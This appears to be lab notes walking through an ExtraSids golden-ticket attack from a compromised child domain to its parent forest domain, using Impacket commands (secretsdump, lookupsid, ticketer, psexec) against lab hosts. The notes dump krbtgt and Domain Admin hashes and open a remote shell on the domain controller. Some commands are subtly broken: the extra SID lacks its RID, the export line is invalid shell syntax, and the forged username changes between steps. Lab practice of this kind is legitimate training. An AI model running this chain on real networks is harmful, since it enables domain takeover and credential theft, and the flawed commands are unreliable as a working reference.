# [Attacking Domain Trusts - Child -> Parent Trusts - from Linux](Attacking%20Domain%20Trusts%20-%20Child%20->%20Parent%20Trusts%20-%20from%20Linux.md)
### Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.

```shell
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
![](Screenshot%202026-06-01%20at%2014.15.23.png)

```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
![](Screenshot%202026-06-01%20at%2014.16.07.png)

```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
![](Screenshot%202026-06-01%20at%2014.18.38.png)

```shell
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114 sjke
```
![](Screenshot%202026-06-01%20at%2014.21.09.png)

```shell
export KRB5CCNAME = sjke.ccache
```
![](Screenshot%202026-06-01%20at%2014.28.09.png)

```shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
![](Screenshot%202026-06-01%20at%2014.28.38.png)

```shell
secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 | grep "bross"
```
![](Screenshot%202026-06-01%20at%2014.30.23.png)